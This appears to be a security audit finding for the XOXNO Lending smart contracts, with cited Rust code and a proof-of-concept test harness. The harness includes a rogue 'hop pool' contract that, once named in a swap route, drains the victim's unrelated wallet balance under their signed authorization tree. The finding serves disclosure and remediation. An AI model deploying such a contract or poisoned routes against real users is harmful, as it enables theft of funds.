### Title
Unvalidated caller-supplied `swap_xdr` lets a route-named contract run arbitrary calls under the swapper's signed auth tree and drain their wallet - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The external report's bug class is "a user-supplied string reaches a system execution call without validation." In XOXNO Lending the identical shape exists: every router strategy entrypoint (`swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`) takes `swap: Bytes` supplied by the caller, forwards it untouched to the swap aggregator, and the route's packed program names arbitrary pool addresses that the router invokes. Nothing in the controller or router validates or allowlists those addresses, so a malicious route can put attacker code on the call stack inside the victim's `require_auth` tree and execute `token.transfer(victim → attacker, victim_balance)` — draining tokens far beyond the routed amount.

### Finding Description
- `swap_collateral` requires only `require_authorized_caller` and owner/delegate auth on the account, then forwards the raw `swap` bytes [1](#0-0) 
- `swap_tokens` authorizes exactly one input transfer to the router (`authorize_transfer_as_current`) and calls `router.execute_strategy(&controller, &amount_in, swap)` without decoding the payload — the controller's overspend/output guards only bound the *routed* amount, not other invocations in the tree [2](#0-1) 
- The packed program indexes a caller-controlled `assets` registry for pool addresses (`idx_a` → pool) with no venue/pool allowlist; venue calls are `env.invoke_contract` on payload-named addresses [3](#0-2) 
- The threat model itself confirms the router "keeps no allowlist" and that a route "can put third-party code on the call stack below the caller's authorization," where a `transfer` such code makes "executes if the caller signs that tree" — the loss being "the caller's wallet, not the routed amount" [4](#0-3) 

The harness test proves end-to-end exploitability: a rogue "hop pool" named in the route performs `wallet_token.transfer(alice → attacker, WALLET_BALANCE)`, simulation records it as a child of Alice's `swap_collateral` auth entry, the swap still pays fair output (so all settlement checks pass), and Alice's entire unrelated wallet balance is stolen [5](#0-4) 

### Impact Explanation
Theft of user funds. Any token balance in the victim's wallet (unrelated to the swap, unbounded by `amount_in`, `min_out`, `RouterOverspend`, or the final risk gate) can be transferred to the attacker. The honest-looking swap still succeeds, so neither the victim's position checks nor simulation result-value inspection reveals anything abnormal — only the recorded auth tree does.

### Likelihood Explanation
Medium. The attack requires the victim to sign a poisoned route — e.g., a malicious/compromised quote source or UI serving a `routeXdr` with an attacker-deployed pool in `assets`. An unprivileged attacker can deploy such a contract and craft a fully valid payload; the victim's signature on the deceptive auth tree is the only precondition, exactly like the upstream advisory's unauthenticated reachability plus a social/step precondition. Honest simulation surfaces the rogue child entry, so clients that decode routes mitigate it — but nothing on-chain enforces that discipline.

### Recommendation
Enforce route integrity on-chain rather than relying on client decoding: have the router (or controller) restrict hop pool addresses to a governance-managed venue allowlist (as already done for Blend migration pools per INV-STRAT-03), or have the controller assert the recorded invocation tree contains no child invocations beyond the single authorized input transfer before accepting settlement.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: `UnlistedPoolRouter`/`RogueHopPool` model a route whose `hop_pool` is attacker-deployed; calling `swap_collateral(alice, account_id, usdc, SWAP_IN_USDC, eth, route)` moves `WALLET_BALANCE` of an unrelated token from Alice to the attacker while crediting Alice a fair `FAIR_OUT_ETH` output [6](#0-5)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L33-55)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** skills/xoxno-swap-aggregator/payload.md (L60-66)
```markdown
| Byte | Field | Swap (`opcode 0..=4`) | Burn (`5`) | Mint (`6`) |
|---|---|---|---|---|
| `[0]` | `opcode` | `0` Soroswap, `1` Aquarius (the encoder also maps Aquarius CLMM pools here), `2` Phoenix, `3` Sushi, `4` CometDex | Aquarius withdraw | Aquarius deposit |
| `[1]` | `mode` | any | must be `All` (`0`) | must be `All` (`0`) |
| `[2]` | `idx_a` | pool → `assets` | pool | pool |
| `[3]` | `idx_b` | `token_in` → `assets` | share token → `assets` | share token → `assets` |
| `[4]` | `idx_c` | `token_out` → `assets` (≠ `idx_b`) | first index of the per-constituent floor run in `amounts` | index of `mint_min_shares` in `amounts` |
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-72)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```
